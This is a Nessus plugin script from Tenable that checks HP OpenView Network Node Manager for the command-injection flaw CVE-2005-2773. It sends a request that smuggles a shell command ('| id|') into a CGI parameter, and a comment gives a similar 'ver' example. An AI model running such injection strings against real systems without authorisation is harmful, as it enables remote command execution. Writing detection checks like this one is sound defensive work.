#
# (C) Tenable Network Security
#


if (description) {
  script_id(19555);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-2773");
  script_bugtraq_id(14662, 14737);

  name["english"] = "HP OpenView Network Node Manager Multiple Remote Command Execution Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a CGI script that allows execution of
arbitrary commands. 

Description :

The remote version of HP OpenView Network Node Manager fails to
sanitize user-supplied input to various parameters used in the
'cdpView.ovpl', 'connectedNotes.ovpl', 'ecscmg.ovpl', and
'freeIPaddrs.ovpl' scripts before using it to run a command.  By
leveraging these flaws, an unauthenticated attacker may be able to
execute arbitrary commands on the remote host within the context of
the affected web server userid. 

See also : 

http://www.securityfocus.com/archive/1/409179
http://www.securityfocus.com/archive/1/409196
http://www.securityfocus.com/advisories/9150
http://www4.itrc.hp.com/service/cki/docDisplay.do?docId=c00604164

Solution : 

Apply patched referenced in the vendor advisory above.

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple remote command execution vulnerabilities in HP OpenView Network Node Manager";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80, 3443);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:3443);
if (!get_port_state(port)) exit(0);
if (get_kb_item("Services/www/" + port + "/embedded")) exit(0);


# /OvCgi/connectedNodes.ovpl?node=127.0.0.1|ver displays the version of the remote Windows system
# with a vulnerable version of HP OpenView NNM
req = http_get(
  item:string("/OvCgi/freeIPaddrs.ovpl?netnum=127.0.0.1&netmask=255.255.255.0&netid=127.0.0.1%20|%20id|"),
  port:port
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);

if ( "<FONT SIZE=+1><B>FATAL ERROR: Could not close ovtopodump -r 127.0.0.1 | id|. Have your administrator run 'ovstart'</B></FONT>" >< res )
  security_hole(port);
